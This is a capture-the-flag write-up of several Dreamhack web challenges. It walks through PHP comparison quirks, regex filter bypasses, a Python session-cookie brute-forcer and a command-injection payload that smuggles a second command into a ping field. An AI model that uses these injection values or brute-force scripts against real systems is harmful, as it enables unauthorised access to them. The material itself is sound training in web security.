---
title: Dreamhack (1)
published: 2025-01-01
category: Writeups
tags: [web, dh, dreamhack, ctf]
image: "./image/titles/dreamhack.png"
description: Some cool and fun web challenges from dreamhack.
draft: false
---

# Web Hacking

## php7cmp4re

[Challenge](https://dreamhack.io/wargame/challenges/1113)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/f4adadf9-c48c-451f-83f9-ec1c03f1f672.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241227%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241227T001853Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=da0de8de3c6b25851678d3204b6c31cb945b899b1cc1e9f257c007a91ce195d0)

For this challenge, we need to analyze string comparison in PHP, specifically in the following `script`:

```php
 <?php
    require_once('flag.php');
    error_reporting(0);
    // POST request
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
      $input_1 = $_POST["input1"] ? $_POST["input1"] : "";
      $input_2 = $_POST["input2"] ? $_POST["input2"] : "";
      sleep(1);

      if($input_1 != "" && $input_2 != ""){
        if(strlen($input_1) < 4){
          if($input_1 < "8" && $input_1 < "7.A" && $input_1 > "7.9"){
            if(strlen($input_2) < 3 && strlen($input_2) > 1){
              if($input_2 < 74 && $input_2 > "74"){
                echo "</br></br></br><pre>FLAG\n";
                echo $flag;
                echo "</pre>";
              } else echo "<br><br><br><h4>Good try.</h4>";
            } else echo "<br><br><br><h4>Good try.</h4><br>";
          } else echo "<br><br><br><h4>Try again.</h4><br>";
        } else echo "<br><br><br><h4>Try again.</h4><br>";
      } else{
        echo '<br><br><br><h4>Fill the input box.</h4>';
      }
    } else echo "<br><br><br><h3>WHat??!</h3>";
    ?> 
```

We need to find the correct conditions for `input_1` and `input_2` to obtain the flag, specifically by converting the string to ASCII.

```shell
input_1 < "8"          <=>       input_1 < 56
input_1 < "7.A"        <=>       input_1 < 55 46 65
input_1 > "7.9"        <=>       input_1 > 55 46 57
```

If the beginning of the strings is equal, the comparison will proceed from the next part onward.

we can have 

```shell
56 46 65 > input_1 > 55 46 57    <=> 56 46 65 > 55 46 [58-64] > 55 46 57

=> input_1 = 55 46 [58-64], I used 55 46 58 (7.:)
```

```shell
input_2 < 74      <=>    input_2 < 74 
input_2 > "74"    <=>    input_2 > 55 52

=> 74 > input_2 >  55 52 
=> input_2 = [56-73] [53-...], I used 56 53 (8Z)
```

```shell
input_1=7.:&input_2=8Z
```

---

## phpreg

[Challenge](https://dreamhack.io/wargame/challenges/873)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/34b9d233-11cb-4c9b-8cc1-c70b0d1d6c12.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241227%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241227T032936Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=50a46a838f4ee612c46aafce80cf4e03741ec4b5085c3c5f83feb09d2d9da8ae)

In this challenge, we need to bypass PHP's string replacement function. 

```php
<?php
          // POST request
          if ($_SERVER["REQUEST_METHOD"] == "POST") {
            $input_name = $_POST["input1"] ? $_POST["input1"] : "";
            $input_pw = $_POST["input2"] ? $_POST["input2"] : "";

            // pw filtering
            if (preg_match("/[a-zA-Z]/", $input_pw)) {
              echo "alphabet in the pw :(";
            }
            else{
              $name = preg_replace("/nyang/i", "", $input_name);
              $pw = preg_replace("/\d*\@\d{2,3}(31)+[^0-8\"]\!/", "d4y0r50ng", $input_pw);
              
              if ($name === "dnyang0310" && $pw === "d4y0r50ng+1+13") {
                echo '<h4>Step 2 : Almost done...</h4><div class="door_box"><div class="door_black"></div><div class="door"><div class="door_cir"></div></div></div>';

                $cmd = $_POST["cmd"] ? $_POST["cmd"] : "";

                if ($cmd === "") {
                  echo '
                        <p><form method="post" action="/step2.php">
                            <input type="hidden" name="input1" value="'.$input_name.'">
                            <input type="hidden" name="input2" value="'.$input_pw.'">
                            <input type="text" placeholder="Command" name="cmd">
                            <input type="submit" value="제출"><br/><br/>
                        </form></p>
                  ';
                }
                // cmd filtering
                else if (preg_match("/flag/i", $cmd)) {
                  echo "<pre>Error!</pre>";
                }
                else{
                  echo "<pre>--Output--\n";
                  system($cmd);
                  echo "</pre>";
                }
              }
              else{
                echo "Wrong nickname or pw";
              }
            }
          }
          // GET request
          else{
            echo "Not GET request";
          }
      ?>
```

We have the case where `name` will replace the string `nyang` with `""`, and `pw` will replace the `alphabetic` expression with `d4y0r50ng`. The condition to execute the `command` is 

```shell
name = "dnyang0310" 
pw = "d4y0r50ng+1+13"
```
From here, we will analyze further.

```shell
$name = preg_replace("/nyang/i", "", $input_name);
```

Here, if the string "nyang" appears in the name field, it will be replaced with an empty string. Therefore, the basic customization approach is to include it in the middle so that when it is removed, the remaining string will be correct.
=> name = "dnynyangang0310" After passing through the function, it will become "dnyang0310"

```shell
$pw = preg_replace("/\d*\@\d{2,3}(31)+[^0-8\"]\!/", "d4y0r50ng", $input_pw)
```

Here, we need to create a string that the replacement function will transform into the string "d4y0r50ng", as we cannot include alphabetic characters in this field due to the following code:

```php
if (preg_match("/[a-zA-Z]/", $input_pw)) {
              echo "alphabet in the pw :(";
}
```

```
The condition you've provided is a regular expression pattern with the following breakdown:

\d*: Matches any sequence of digits (0 or more digits) or no digits at all.
\@: Matches the literal character @.
\d{2,3}: Matches 2 or 3 consecutive digits.
(31)+: Matches one or more occurrences of the string 31.
[^0-8\"]: Matches any character that is not a digit from 0 to 8 or the double-quote character ".
\!: Matches the exclamation mark ! at the end.

=> pw = 123@12031319!+1+13
```

We were able to access it, and at this point, there was an obstacle: reading the `flag.txt` file. If it contains the word flag, an error message would be triggered. Therefore, I used `cat *`` to attempt displaying the contents of all files in the dream directory, and I was successful.

```shell
cmd = cd ../dream; cat *
```
![pic1](./image/dreamhack/1.png)

---

## Flying Chars

[Challenge](https://dreamhack.io/wargame/challenges/850)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/be97a9ea-f458-4c85-ad51-da780b7d5748.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241227%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241227T043502Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=3b7b55a84d723b9d91b965b190e0770003d8cc58458687598aa3f6546953d1a8)

In this challenge, the information about the letters moves quickly. I opened the `developer tools` and examined the `source`, where I found many images labeled from [0-19], which represent the letters. I used the arrangement in the source code to extract the letters.

![pic2](./image/dreamhack/2.png)

```javascript
  <script type="text/javascript">
    const img_files = ["/static/images/10.png", "/static/images/17.png", "/static/images/13.png", "/static/images/7.png","/static/images/16.png", "/static/images/8.png", "/static/images/14.png", "/static/images/2.png", "/static/images/9.png", "/static/images/5.png", "/static/images/11.png", "/static/images/6.png", "/static/images/12.png", "/static/images/3.png", "/static/images/0.png", "/static/images/19.png", "/static/images/4.png", "/static/images/15.png", "/static/images/18.png", "/static/images/1.png"];
    var imgs = [];
    for (var i = 0; i < img_files.length; i++){
      imgs[i] = document.createElement('img');
      imgs[i].src = img_files[i]; 
      imgs[i].style.display = 'block';
      imgs[i].style.width = '10px';
      imgs[i].style.height = '10px';
      document.getElementById('box').appendChild(imgs[i]);
    }
```

After rearranging according to the order in the source code, we have the string

```shell
Too_H4rd_to_sEe_th3_Ch4rs_X.X
```

And note from the challenge description to adjust the content accordingly.

```
Stop the flying letters and figure out the whole string! The flag format is DH {full string}.

❗ The problem is that attachments are not provided.
❗ Of the letters included in the flagx,,s, o are all lowercase letters.
❗ All alphabets included in the flag C are capital letters.
```

---

## ex-reg-ex

[Challenge](https://dreamhack.io/wargame/challenges/834)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/a0486950-f6fc-48ba-8fb5-2b978a8268a6.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241227%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241227T033228Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=75a8cdfae702b09e2bcb0047d9fe5f762f6cd1ff46222ba6103186b7b5e8e631)

In this challenge, we just need to bypass the condition to obtain the `flag`

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
import re

app = Flask(__name__)

try:
    FLAG = open("./flag.txt", "r").read()       # flag is here!
except:
    FLAG = "[**FLAG**]"

@app.route("/", methods = ["GET", "POST"])
def index():
    input_val = ""
    if request.method == "POST":
        input_val = request.form.get("input_val", "")
        m = re.match(r'dr\w{5,7}e\d+am@[a-z]{3,7}\.\w+', input_val)
        if m:
            return render_template("index.html", pre_txt=input_val, flag=FLAG)
    return render_template("index.html", pre_txt=input_val, flag='?')

app.run(host="0.0.0.0", port=8000)
```

```shell
m = re.match(r'dr\w{5,7}e\d+am@[a-z]{3,7}\.\w+', input_val)

Condition:
dr: The string must start with dr.
\w{5,7}: Followed by 5 to 7 alphanumeric characters (including underscores) from [a-zA-Z0-9_].
e: Followed by the character e.
\d+: Followed by at least one digit.
am@: Followed by the literal string am@.
[a-z]{3,7}: Followed by 3 to 7 lowercase letters from a to z.
.\w+: Followed by a dot (.) and at least one alphanumeric character or underscore from [a-zA-Z0-9_].

=> m = draaaaaae123am@abcd.d
```

---

## 🌱 simple-web-request

[Challenge](https://dreamhack.io/wargame/challenges/830)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/ce157d19-e182-41f2-a43c-a3194d3fbf74.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241227%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241227T032403Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=74636767536566e6bb7a09aae24b3abcd5474f32a7ddc9f90e2b35caa2f42133)

In this challenge, we need to pass two authentication steps to get the flag.

```python
#!/usr/bin/python3
import os
from flask import Flask, request, render_template, redirect, url_for
import sys

app = Flask(__name__)

try: 
    # flag is here!
    FLAG = open("./flag.txt", "r").read()      
except:
    FLAG = "[**FLAG**]"


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/step1", methods=["GET", "POST"])
def step1():

    #### 풀이와 관계없는 치팅 방지 코드
    global step1_num
    step1_num = int.from_bytes(os.urandom(16), sys.byteorder)
    ####

    if request.method == "GET":
        prm1 = request.args.get("param", "")
        prm2 = request.args.get("param2", "")
        step1_text = "param : " + prm1 + "\nparam2 : " + prm2 + "\n"
        if prm1 == "getget" and prm2 == "rerequest":
            return redirect(url_for("step2", prev_step_num = step1_num))
        return render_template("step1.html", text = step1_text)
    else: 
        return render_template("step1.html", text = "Not POST")


@app.route("/step2", methods=["GET", "POST"])
def step2():
    if request.method == "GET":

    #### 풀이와 관계없는 치팅 방지 코드
        if request.args.get("prev_step_num"):
            try:
                prev_step_num = request.args.get("prev_step_num")
                if prev_step_num == str(step1_num):
                    global step2_num
                    step2_num = int.from_bytes(os.urandom(16), sys.byteorder)
                    return render_template("step2.html", prev_step_num = step1_num, hidden_num = step2_num)
            except:
                return render_template("step2.html", text="Not yet")
        return render_template("step2.html", text="Not yet")
    ####

    else: 
        return render_template("step2.html", text="Not POST")

    
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html", flag_txt="Not yet")
    else:

        #### 풀이와 관계없는 치팅 방지 코드
        prev_step_num = request.form.get("check", "")
        try:
            if prev_step_num == str(step2_num):
        ####

                prm1 = request.form.get("param", "")
                prm2 = request.form.get("param2", "")
                if prm1 == "pooost" and prm2 == "requeeest":
                    return render_template("flag.html", flag_txt=FLAG)
                else:
                    return redirect(url_for("step2", prev_step_num = str(step1_num)))
            return render_template("flag.html", flag_txt="Not yet")
        except:
            return render_template("flag.html", flag_txt="Not yet")
            

app.run(host="0.0.0.0", port=8000)
```

![pic1](./image/dreamhack/3.png)

Here, we need to pass by filling in the information as shown in the `source` code.

```python
@app.route("/step1", methods=["GET", "POST"])
def step1():

    #### 풀이와 관계없는 치팅 방지 코드
    global step1_num
    step1_num = int.from_bytes(os.urandom(16), sys.byteorder)
    ####

    if request.method == "GET":
        prm1 = request.args.get("param", "")
        prm2 = request.args.get("param2", "")
        step1_text = "param : " + prm1 + "\nparam2 : " + prm2 + "\n"
        if prm1 == "getget" and prm2 == "rerequest":
            return redirect(url_for("step2", prev_step_num = step1_num))
        return render_template("step1.html", text = step1_text)
    else: 
        return render_template("step1.html", text = "Not POST")
    
#param=getget&param2=rerequest
```

![pic2](./image/dreamhack/4.png)

In step 2, two values will be received and authenticated at `/flag`. As in the previous step, we just need to follow the correct conditions to get the `flag`

```python
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html", flag_txt="Not yet")
    else:

        #### 풀이와 관계없는 치팅 방지 코드
        prev_step_num = request.form.get("check", "")
        try:
            if prev_step_num == str(step2_num):
        ####

                prm1 = request.form.get("param", "")
                prm2 = request.form.get("param2", "")
                if prm1 == "pooost" and prm2 == "requeeest":
                    return render_template("flag.html", flag_txt=FLAG)
                else:
                    return redirect(url_for("step2", prev_step_num = str(step1_num)))
            return render_template("flag.html", flag_txt="Not yet")
        except:
            return render_template("flag.html", flag_txt="Not yet")
#param=pooost&param2=requeeest
```

---

## devtools-sources

[Challenge](https://dreamhack.io/wargame/challenges/267)
[Sorce](https://sfo2.digitaloceanspaces.com/wargame1/public/6ca11401-aa68-423c-a329-adab220fe5cb.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241227%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241227T082351Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=9a03e831d306635b110d948ee6303be675aab524ac3befb7e0eaecac6bea4b33)

In this challenge, you just need to download the source code and open the file `main.4c6e144e.map`, then search with the keyword `DH{`

---

## session

[Challenge](https://dreamhack.io/wargame/challenges/266)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/c9523329-e152-4482-9037-71bfad0085bc.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241227%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241227T022145Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=79d14d2397dc6f954f30d81817e55fa48667207d3fae34f24814bed5e371f573)

In this challenge, we need to modify the value of the sessionid to match the value for `admin` in order to get the `flag`. In the code, the main function has restricted the sessionid to `1 byte hex` for `admin`. Therefore, I wrote a script to `brute-force` each `1-byte hex` and then replace it to retrieve the returned data.

`script` 

```python
import requests
import itertools

url = "http://host1.dreamhack.games:22910/"

session_ids = [f"{i:02x}" for i in range(256)]

for session_id in session_ids:
    cookies = {'sessionid': session_id}
    response = requests.get(url, cookies=cookies)

    if "DH{" in response.text:
        print(f"Found admin session! Session ID: {session_id}")
        print(response.text)
        break
else:
    print("Admin session not found.")

```

`output`

```html
Found admin session! Session ID: db
<!doctype html>
<html>
  <head>
    <link rel="stylesheet" href="/static/css/bootstrap.min.css">
    <link rel="stylesheet" href="/static/css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="/static/css/non-responsive.css">
    <title>Index Session</title>
    
  
  <style type="text/css">
    .important { color: #336699; }
  </style>

  </head>
<body>

    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Session</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="#">About</a></li>
          </ul>

          <ul class="nav navbar-nav navbar-right">
            <li><a href="/login">Login</a></li>
          </ul>

        </div><!--/.nav-collapse -->
      </div>
    </nav>
    <!--
      # default account: guest/guest
    -->
    <div class="container">

  <p class="important">
        Welcome !
  </p>

  <h3>
        Hello admin, flag is DH{73b3a0ebf47fd6f68ce623853c1d4f138ad91712}

  </h3>


    </div> <!-- /container -->

    <!-- Bootstrap core JavaScript -->
    <script src="/static/js/jquery.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
</body>
</html>
```

---

## Carve Party

[Challenge](https://dreamhack.io/wargame/challenges/96)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/ef94cca3-830e-41e0-b929-30648719df0c.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241227%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241227T114943Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=8b5debf5f201c7eb9a2060d1cb4dbfa87b368eff2dd84fd343d10d8be0e071c7)

Since the challenge doesn't create a web interface, I think the `flag` is embedded in the source code. Indeed, if we pay close attention, we can see an array `pumpkin` and `pie` performing `XOR` operations and altering the values. I wrote a script to decode and print the data, and successfully obtained the `flag`

`script`

```python
pumpkin = [ 124, 112, 59, 73, 167, 100, 105, 75, 59, 23, 16, 181, 165, 104, 43, 49, 118, 71, 112, 169, 43, 53]
pie = 1

for cnt in range(10000):
    if cnt <=10000 and cnt %100 ==0:
        for i in range(len(pumpkin)):
            pumpkin[i] ^= pie
            pie = ((pie^0xff) + (i*10)) & 0xff
flag = ''.join([chr(i) for i in pumpkin])
print(flag)
#DH{I_lik3_pumpk1n_pi3}
```

---

## web-misconf-1

[Challenge](https://dreamhack.io/wargame/challenges/45)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/f60b277a-74f3-4262-a578-4dc948331249.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241227%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241227T114547Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=32be643efef2fe2ee9851490187f2b38978b3947322f3bb8360b5df469d42389)

In this challenge, we just need to log in with the basic credentials admin:admin and explore every corner of the website to find the `flag` in `Server Admin/Setting`

![pic1](./image/dreamhack/5.png)

---

## command-injection-1

[Challenge](https://dreamhack.io/wargame/challenges/44)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/bab8d6f6-f766-4ddc-91dd-ed9eed1504ed.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241227%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241227T112611Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=576220bc2637a3c5fb3b605dbd6c3d806c961f9a9745f7620e12740674c202a7)

In this challenge, we will `exploit the command injection` vulnerability to attack by concatenating and splitting commands using appropriate logic.

```python
#!/usr/bin/env python3
import subprocess

from flask import Flask, request, render_template, redirect

from flag import FLAG

APP = Flask(__name__)


@APP.route('/')
def index():
    return render_template('index.html')


@APP.route('/ping', methods=['GET', 'POST'])
def ping():
    if request.method == 'POST':
        host = request.form.get('host')
        cmd = f'ping -c 3 "{host}"'
        try:
            output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
            return render_template('ping_result.html', data=output.decode('utf-8'))
        except subprocess.TimeoutExpired:
            return render_template('ping_result.html', data='Timeout !')
        except subprocess.CalledProcessError:
            return render_template('ping_result.html', data=f'an error occurred while executing the command. -> {cmd}')

    return render_template('ping.html')


if __name__ == '__main__':
    APP.run(host='0.0.0.0', port=8000)
```

Typically, Linux commands are separated by characters like `;`, `|`, `&`, and newline `\n`. However, in this case, we face a challenge because the host input is regulated by a regex in the `ping.html` file, and the host is enclosed within double quotes `""`. Therefore, we will exploit this by bypassing the input validation pattern and using commands to separate and execute.

```shell
cmd = ping -c 3 "{host}" 
if host = 1.1.1.1
=> cmd = ping -c 3 "1.1.1.1"
exploit:
host = 1.1.1.1"; ls # 
=> cmd = ping -c 3 "1.1.1.1"; ls #"
The # symbol in Linux marks the start of a comment, so any characters following it will be ignored.
```

Note: Remove pattern="[A-Za-z0-9.]{5,20}" in the developer tools to bypass input validation.

![pic1](./image/dreamhack/6.png)

![pic2](./image/dreamhack/7.png)

![pic3](./image/dreamhack/8.png)

---